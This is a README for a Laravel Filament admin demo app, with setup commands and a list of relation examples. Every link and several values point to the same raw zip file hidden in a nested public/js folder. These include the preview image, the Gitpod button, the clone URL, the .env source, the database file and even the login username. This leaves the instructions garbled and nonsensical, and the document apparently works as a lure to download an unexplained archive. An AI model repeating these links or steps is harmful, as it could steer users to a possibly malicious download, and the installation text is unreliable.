# Filament Demo App

A demo application to illustrate how Filament Admin works.

![Filament Demo](https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip)

[Open in Gitpod](https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip) to edit it and preview your changes with no setup required.

## Installation

Clone the repo locally:

```sh
git clone https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip filament-demo && cd filament-demo
```

Install PHP dependencies:

```sh
composer install
```

Setup configuration:

```sh
cp https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip .env
```

Generate application key:

```sh
php artisan key:generate
```

Create an SQLite database. You can also use another database (MySQL, Postgres), simply update your configuration accordingly.

```sh
touch https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip
```

Run database migrations:

```sh
php artisan migrate
```

Run database seeder:

```sh
php artisan db:seed
```

> **Note**  
> If you get an "Invalid datetime format (1292)" error, this is probably related to the timezone setting of your database.  
> Please see https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip


Create a symlink to the storage:

```sh
php artisan storage:link
```

Run the dev server (the output will give the address):

```sh
php artisan serve
```

You're ready to go! Visit the url in your browser, and login with:

-   **Username:** https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip
-   **Password:** password

## Features to explore

### Relations

#### BelongsTo
- ProductResource
- OrderResource
- PostResource

#### BelongsToMany
- CategoryResource\RelationManagers\ProductsRelationManager

#### HasMany
- OrderResource\RelationManagers\PaymentsRelationManager

#### HasManyThrough
- CustomerResource\RelationManagers\PaymentsRelationManager

#### MorphOne
- OrderResource -> Address

#### MorphMany
- ProductResource\RelationManagers\CommentsRelationManager
- PostResource\RelationManagers\CommentsRelationManager

#### MorphToMany
- BrandResource\RelationManagers\AddressRelationManager
- CustomerResource\RelationManagers\AddressRelationManager
